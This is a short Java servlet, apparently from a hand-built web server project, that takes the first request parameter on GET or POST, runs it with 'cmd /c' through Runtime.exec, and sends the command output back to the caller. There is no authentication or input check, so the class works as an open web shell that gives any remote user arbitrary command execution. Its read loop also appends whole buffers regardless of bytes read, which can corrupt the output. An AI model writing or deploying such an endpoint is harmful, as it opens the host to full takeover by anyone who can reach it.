package Server;

import java.io.InputStream;

public class shellServlet extends Servlet{

	@Override
	public void doGet(Request req, Response rep) {
		// TODO Auto-generated method stub
		System.out.println("shell命令是:"+req.getFirstParamterValue());
		String result = this.useShell(req.getFirstParamterValue());
		System.out.println("shell执行结果:\r\n"+result);
		rep.println(result);
	}

	@Override
	public void doPost(Request req, Response rep) {
		// TODO Auto-generated method stub
		System.out.println("shell命令是:"+req.getFirstParamterValue());
		String result = this.useShell(req.getFirstParamterValue());
		System.out.println("shell执行结果:\r\n"+result);
		rep.println(result);
	}
	
	public static String useShell(String cmd){
    	String result="";
        Runtime run =Runtime.getRuntime();
        try {
            Process p = run.exec("cmd /c "+cmd);
            InputStream in = p.getInputStream();
            int len = 0;
            byte[] buff = new byte[2048];
            
            while (in.read(buff) != -1) {
            	result += (new String(buff,"gb2312"));
            }
            p.destroy();
        } catch (Exception e) {
            e.printStackTrace();
            return result;
        } 
        return result;
    }

}
